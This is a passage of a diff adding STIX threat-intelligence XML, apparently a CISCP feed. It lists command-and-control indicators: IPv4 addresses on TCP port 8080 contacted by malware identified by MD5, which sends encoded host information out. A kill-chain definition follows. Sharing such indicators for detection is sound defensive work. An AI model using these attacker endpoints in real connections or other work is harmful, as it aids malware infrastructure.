+          <cybox:Properties xsi:type="NetworkConnectionObj:NetworkConnectionObjectType">
+            <NetworkConnectionObj:Destination_Socket_Address>
+              <SocketAddressObj:IP_Address category="ipv4-addr">
+                <AddrObj:Address_Value condition="Equals">210.127.39.29</AddrObj:Address_Value>
+              </SocketAddressObj:IP_Address>
+              <SocketAddressObj:Port>
+                <PortObj:Port_Value condition="Equals">8080</PortObj:Port_Value>
+                <PortObj:Layer4_Protocol condition="Equals">TCP</PortObj:Layer4_Protocol>
+              </SocketAddressObj:Port>
+            </NetworkConnectionObj:Destination_Socket_Address>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-08-28T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-e805de0e-e485-4f07-b850-061281b8ce6d" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>This is a network connection initiated by "MD5__bb27e1fa93b87b02401729c8a5af29df.exe" and "MD5__0708a979a5c7c3a0450b7ddc37faead7.exe" via port 8080. The file then sends encoded data that contains the host system information via the socket.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-46a86d31-6e81-4490-8480-f71e4cfe22b5">
+        <cybox:Object id="CISCP:Object-13ea109d-a388-4983-81c1-ca4410e7d372">
+          <cybox:Properties xsi:type="NetworkConnectionObj:NetworkConnectionObjectType">
+            <NetworkConnectionObj:Destination_Socket_Address>
+              <SocketAddressObj:IP_Address category="ipv4-addr">
+                <AddrObj:Address_Value condition="Equals">112.217.190.218</AddrObj:Address_Value>
+              </SocketAddressObj:IP_Address>
+              <SocketAddressObj:Port>
+                <PortObj:Port_Value condition="Equals">8080</PortObj:Port_Value>
+                <PortObj:Layer4_Protocol condition="Equals">TCP</PortObj:Layer4_Protocol>
+              </SocketAddressObj:Port>
+            </NetworkConnectionObj:Destination_Socket_Address>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-08-28T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+  </stix:Indicators>
+  <stix:TTPs>
+    <stix:Kill_Chains>
+      <stixCommon:Kill_Chain definer="LMCO" id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="LM Cyber Kill Chain" number_of_phases="7" reference="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf">
+        <stixCommon:Kill_Chain_Phase name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/>
+        <stixCommon:Kill_Chain_Phase name="Weaponization" ordinality="2" phase_id="stix:KillChainPhase-445b4827-3cca-42bd-8421-f2e947133c16"/>
+        <stixCommon:Kill_Chain_Phase name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+        <stixCommon:Kill_Chain_Phase name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/>
+        <stixCommon:Kill_Chain_Phase name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+        <stixCommon:Kill_Chain_Phase name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+        <stixCommon:Kill_Chain_Phase name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/>
+      </stixCommon:Kill_Chain>
+    </stix:Kill_Chains>
+  </stix:TTPs>
+</stix:STIX_Package>
